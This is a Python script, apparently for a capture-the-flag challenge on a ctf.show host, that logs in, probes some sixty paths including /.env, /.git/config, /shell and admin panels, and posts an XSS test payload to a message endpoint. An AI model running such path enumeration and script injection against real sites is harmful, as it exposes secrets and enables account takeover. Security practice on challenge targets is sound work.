import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://c1dfcbb0-9c8a-478f-8b6b-bc87e9fbdc62.challenge.ctf.show"

s = requests.Session()
s.verify = False

# Login
r = s.post(f"{BASE}/login", data={"username": "test", "password": "test"}, allow_redirects=False)
print(f"Login: {r.status_code}, cookie: {dict(s.cookies)}")

# Probe routes
print("=== Probe routes ===")
routes = ["/admin", "/admin/", "/flag", "/source", "/app.py", "/login.html",
           "/register", "/logout", "/session", "/debug", "/trace", "/config",
           "/static", "/static/", "/.git/config", "/.env", "/vendor", "/requirements.txt",
           "/Dockerfile", "/flag.txt", "/robots.txt", "/sitemap.xml", "/info",
           "/favicon.ico", "/API", "/api/", "/api/v1", "/users", "/admin_panel",
           "/adminpanel", "/panel", "/dashboard", "/me", "/user", "/account",
           "/settings", "/manage", "/console", "/shell", "/cmd", "/exec",
           "/server-status", "/server-info", "/nginx_status", "/phpinfo.php",
           "/wp-admin", "/admin-login", "/flag.php", "/admin.php", "/index.php",
           "/upload", "/download", "/file", "/files", "/uploads", "/test",
           "/login/", "/login_admin", "/admin_login", "/whatever"]
for route in routes:
    try:
        r = s.get(f"{BASE}{route}", allow_redirects=False)
        loc = r.headers.get("Location", "")
        status = r.status_code
        cl = len(r.content)
        sc = r.headers.get("Set-Cookie", "")
        if status not in (404, 403) or loc or sc:
            marker = " <===" if (status == 200 or loc) else ""
            print(f"  {route}: {status} len={cl} loc={loc}{marker}")
    except Exception as e:
        print(f"  {route}: ERROR {type(e).__name__}: {e}")

# Also test message with various payloads
print()
print("=== Message XSS test ===")

# Send a message with XSS payload
payload = '<img src=x onerror="alert(1)">'
r = s.post(f"{BASE}/message", data={"msg": payload, "sessionid": s.cookies.get("session", "")})
print(f"Status: {r.status_code}")
print(f"Body: {r.text[:300]}")

# Check if there's a way to see received messages
for p in ["/inbox", "/mailbox", "/messages", "/all_messages", "/read", "/view"]:
    r = s.get(f"{BASE}{p}", allow_redirects=False)
    if r.status_code == 200:
        print(f"  Found: {p} -> {r.text[:300]}")